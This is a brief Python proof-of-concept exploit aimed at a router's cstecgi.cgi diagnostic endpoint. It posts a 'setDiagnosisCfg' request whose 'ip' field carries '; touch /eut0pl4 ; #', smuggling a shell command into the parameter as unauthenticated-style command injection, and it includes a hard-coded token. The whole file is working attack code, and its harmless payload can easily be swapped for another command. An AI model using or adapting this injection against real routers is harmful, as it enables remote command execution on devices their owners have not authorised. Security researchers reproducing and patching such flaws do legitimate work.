# export QUERY_STRING=
# export CONTENT_LENGTH=
import requests

HOST = "192.168.0.1"
PORT = 80

url = f"http://{HOST}/cgi-bin/cstecgi.cgi"

data = {
    "topicurl": "setDiagnosisCfg",
    "ip": "; touch /eut0pl4 ; #",
    "token": "5a65e2cdb95c558d33521f54a6a912f2",
}

res = requests.post(url, json=data)

print(f"res: {res.status_code} {res.text}")
